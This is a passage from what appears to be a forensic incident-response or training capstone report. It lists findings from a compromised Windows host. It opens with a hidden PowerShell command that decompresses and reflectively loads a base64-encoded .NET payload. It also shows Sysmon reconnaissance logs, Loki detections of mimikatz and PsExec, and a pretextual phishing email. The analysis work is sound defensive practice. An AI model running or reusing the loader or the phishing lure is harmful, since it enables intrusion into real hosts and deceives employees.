Args: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Sta -Nop -Window Hidden -Command "sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null"
```

---

**Finding 8:** Lateral Movement in Sysmon Logs (EventID 1):

```
2022-02-12 21:12:37: Local Accounts Discovery, Whoami Execution, Whoami Execution Anomaly - "C:\Windows\system32\whoami.exe"
2022-02-12 21:13:46: Net.exe Execution - "C:\Windows\system32\net.exe" localgroup Administrators
2022-02-12 21:13:46: Net.exe Execution - C:\Windows\system32\net1 localgroup Administrators
2022-02-12 21:38:59: Net.exe Execution - net accounts /domain
2022-02-12 21:38:59: Net.exe Execution - C:\Windows\system32\net1 accounts /domain
2022-02-12 21:39:00: Net.exe Execution - net accounts /domain
2022-02-12 21:39:00: Net.exe Execution - C:\Windows\system32\net1 accounts /domain
```

---

**Finding 9:** Loki Detections:

```
20220323T10:19:59Z DESKTOP-MHD4FCE LOKI: Notice: MODULE: Init MESSAGE: Starting Loki Scan VERSION: 0.44.1 SYSTEM: DESKTOP-MHD4FCE TIME: 20220323T10:19:59Z PLATFORM: 10 10.0.19041 SP0 Multiprocessor Free PROC: Intel64 Family 6 Model 126 Stepping 5, GenuineIntel ARCH: 32bit WindowsPE
20220323T10:19:59Z DESKTOP-MHD4FCE LOKI: Notice: MODULE: PESieve MESSAGE: Cannot find PE-Sieve in expected location C:\Downloads\Volatility\loki\tools\pe-sieve64.exe SOURCE: https://github.com/hasherezade/pe-sieve
20220323T10:19:59Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: File Name Characteristics initialized with 3211 regex patterns
20220323T10:19:59Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: C2 server indicators initialized with 34994 elements
20220323T10:19:59Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Malicious MD5 Hashes initialized with 5842 hashes
20220323T10:20:00Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Malicious SHA1 Hashes initialized with 1020 hashes
20220323T10:20:00Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Malicious SHA256 Hashes initialized with 1844 hashes
20220323T10:20:00Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: False Positive Hashes initialized with 30 hashes
20220323T10:20:00Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Processing YARA rules folder C:\Downloads\Volatility\loki\signature-base\yara
20220323T10:20:12Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Initializing all YARA rules at once (composed string of all rule files)
20220323T10:20:12Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Initialized 564 Yara rules
20220323T10:20:12Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Current user has admin rights - very good
20220323T10:20:12Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Init MESSAGE: Setting LOKI process with PID: 10236 to priority IDLE
20220323T10:20:12Z DESKTOP-MHD4FCE LOKI: Info: MODULE: FileScan MESSAGE: Scanning Path .\ ...  
20220323T10:22:55Z DESKTOP-MHD4FCE LOKI: Warning: MODULE: FileScan MESSAGE: FILE: .\dlldump\module.548.134dc3080.7ff71a130000.dll SCORE: 90 TYPE: EXE SIZE: 471040 FIRST_BYTES: 4d5a90000300000004000000ffff0000b8000000 / <filter object at 0x041D1B68> MD5: 3a40e8c3e15c38eee644c13195ed0501 SHA1: 1a66b8b81f7f7d80948c9ec354bb244b8aad800f SHA256: e07564452260ae1c7f4b6bf5f892cfd81cb493467c08ba5c8463878450e6d735 CREATED: Tue Mar 22 20:32:41 2022 MODIFIED: Tue Mar 22 20:32:41 2022 ACCESSED: Wed Mar 23 03:22:54 2022 REASON_1: Yara Rule MATCH: btv_challenge_fuzzy SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Fuzzy) REF: - AUTHOR: - MATCHES: Str1: FuzzService
20220323T10:23:54Z DESKTOP-MHD4FCE LOKI: Warning: MODULE: FileScan MESSAGE: FILE: .\dlldump\module.7036.98ee9800.7ffdc6370000.dll SCORE: 90 TYPE: EXE SIZE: 700416 FIRST_BYTES: 4d5a000000000000000000000000000000000000 / <filter object at 0x0389C4F0> MD5: 8cadd4eb9a8df8b40dea7eaa0f805374 SHA1: 5b7d68e0a9105275dda0f8dc57afe93d29e4bdbe SHA256: 4c2fff763473ffb0b40fb7857c35bef36bda6ff68ddb58d709a5f5c46d50ee3d CREATED: Tue Mar 22 20:43:52 2022 MODIFIED: Tue Mar 22 20:43:52 2022 ACCESSED: Wed Mar 23 03:23:54 2022 REASON_1: Yara Rule MATCH: btv_challenge_acid SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Acid) REF: - AUTHOR: - MATCHES: Str1: PSExec
20220323T10:25:35Z DESKTOP-MHD4FCE LOKI: Alert: MODULE: FileScan MESSAGE: FILE: .\malfind\process.0xffff870a25bbd800.0x2686cd40000.dmp SCORE: 330 TYPE: UNKNOWN SIZE: 1015807 FIRST_BYTES: 0000000000000000000000000000000000000000 / <filter object at 0x0389CE08> MD5: 8ebd020f5042f48def35d0da7df93083 SHA1: f7aa0fd5a20175becbc44634af48c18c1b54ca66 SHA256: cb0f21bc068ed79e33bcbe40c92aa6eaa97337b561046e4e72b6c7d355488231 CREATED: Wed Mar 23 03:19:21 2022 MODIFIED: Wed Mar 23 03:19:21 2022 ACCESSED: Wed Mar 23 03:25:34 2022 REASON_1: Yara Rule MATCH: btv_challenge_doom SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Doom) REF: - AUTHOR: - MATCHES: Str1: mimikatz Str2: mimikatz Str3: MIMIKATZREASON_2: Yara Rule MATCH: btv_challenge_acid SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Acid) REF: - AUTHOR: - MATCHES: Str1: PsExec
20220323T10:25:35Z DESKTOP-MHD4FCE LOKI: Alert: MODULE: FileScan MESSAGE: FILE: .\malfind\process.0xffff870a25bbd800.0x2686d220000.dmp SCORE: 330 TYPE: UNKNOWN SIZE: 1015807 FIRST_BYTES: 0000000000000000000000000000000000000000 / <filter object at 0x041D2B68> MD5: 6a88a5b547723d12e2fae138b64b912a SHA1: e8bd8c1f74e0ca6db7ff1d00f589b8c80503085c SHA256: aa3f3f5239b9aec038987c65938f172367c48f1967e5a43fa1cdafe0d76b64b0 CREATED: Wed Mar 23 03:19:21 2022 MODIFIED: Wed Mar 23 03:19:21 2022 ACCESSED: Wed Mar 23 03:25:35 2022 REASON_1: Yara Rule MATCH: btv_challenge_doom SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Doom) REF: - AUTHOR: - MATCHES: Str1: mimikatz Str2: mimikatz Str3: MIMIKATZREASON_2: Yara Rule MATCH: btv_challenge_acid SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Acid) REF: - AUTHOR: - MATCHES: Str1: PsExec
20220323T10:25:40Z DESKTOP-MHD4FCE LOKI: Warning: MODULE: FileScan MESSAGE: FILE: .\prcdump\executable.548.exe SCORE: 90 TYPE: EXE SIZE: 471040 FIRST_BYTES: 4d5a90000300000004000000ffff0000b8000000 / <filter object at 0x041D57F0> MD5: 3a40e8c3e15c38eee644c13195ed0501 SHA1: 1a66b8b81f7f7d80948c9ec354bb244b8aad800f SHA256: e07564452260ae1c7f4b6bf5f892cfd81cb493467c08ba5c8463878450e6d735 CREATED: Tue Mar 22 18:56:53 2022 MODIFIED: Tue Mar 22 18:56:53 2022 ACCESSED: Wed Mar 23 03:25:40 2022 REASON_1: Yara Rule MATCH: btv_challenge_fuzzy SUBSCORE: 90 DESCRIPTION: Example YARA Rule for BTV Capstone (Fuzzy) REF: - AUTHOR: - MATCHES: Str1: FuzzService
20220323T10:25:45Z DESKTOP-MHD4FCE LOKI: Notice: MODULE: Results MESSAGE: Results: 2 alerts, 3 warnings, 2 notices
20220323T10:25:45Z DESKTOP-MHD4FCE LOKI: Result: MODULE: Results MESSAGE: Indicators detected!
20220323T10:25:45Z DESKTOP-MHD4FCE LOKI: Result: MODULE: Results MESSAGE: Loki recommends checking the elements on virustotal.com or Google and triage with a professional tool like THOR https://nextron-systems.com/thor in corporate networks.
20220323T10:25:45Z DESKTOP-MHD4FCE LOKI: Info: MODULE: Results MESSAGE: Please report false positives via https://github.com/Neo23x0/signature-base
20220323T10:25:45Z DESKTOP-MHD4FCE LOKI: Notice: MODULE: Results MESSAGE: Finished LOKI Scan SYSTEM: DESKTOP-MHD4FCE TIME: 20220323T10:25:45Z
```

---

**Finding 10:** Malicious Email Attachment:

```
From - Sat Feb 12 21:10:06 2022
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: legal-internal@magnumtempus.financial
Received: from ip-172-16-21-100.us-east-2.compute.internal (ip-172-16-21-100.us-east-2.compute.internal [172.16.21.100])
	by magnumtempusfinancial.com with ESMTP
	; Sat, 12 Feb 2022 21:10:06 +0000
Message-ID: <AB10183D-DF8F-431E-B79D-0A05D62B7510@magnumtempusfinancial.com>
Content-Type: multipart/mixed; boundary="===============7328180289099765301=="
MIME-Version: 1.0
Subject: [ACTION REQUIRED] ORGANIZATION IT POLICY VIOLATION
From: legal-internal@magnumtempus.financial
To: karen.metuens@magnumtempusfinancial.com

--===============7328180289099765301==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit


The MagnumTempus Financial CERT and CyberSecurity team have noticed that you are one of the users - "karen.metuens@magnumtempus.financial", "amanda.nuensis@magnumtempus.financial", who have violated the company policy CCG-IV:5-8 on 2/7/2022, 8:48pm - EDT.

As mentioned in the yearly cybersecurity training and your employment agreement with MagnumTempus, the violation of IT policy may terminate your employment.

Please review the attachment which includes the decision made by the MagnumTempus Legal team. If the document is empty, reply to this email within 72 hours of opening the document.

Thank you,
MagnumTempus Internal Legal Department
(+1)969-555-5984
legal-internal@magnumtempus.financial

--===============7328180289099765301==
Content-Type: application/octet-stream
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename=MagnumTempus-Policy-Violation-karen.metuens@magnumtempusfinancial.com.doc
```

